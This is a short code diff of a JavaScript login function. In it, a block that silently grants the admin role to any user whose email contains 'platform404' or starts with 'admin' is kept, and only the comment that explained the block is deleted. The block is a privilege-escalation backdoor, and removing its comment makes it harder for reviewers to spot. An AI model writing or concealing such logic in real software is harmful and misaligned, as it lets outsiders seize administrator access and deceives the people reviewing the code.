@@ -77,7 +77,6 @@ async function login(body) {
     throw err;
   }
 
-  // Auto-upgrade platform404 user to admin if not already
   if (user.role !== 'admin' && (cleanEmail.includes('platform404') || cleanEmail.startsWith('admin'))) {
     await query("UPDATE users SET role = 'admin' WHERE id = $1", [user.id]);
     user.role = 'admin';
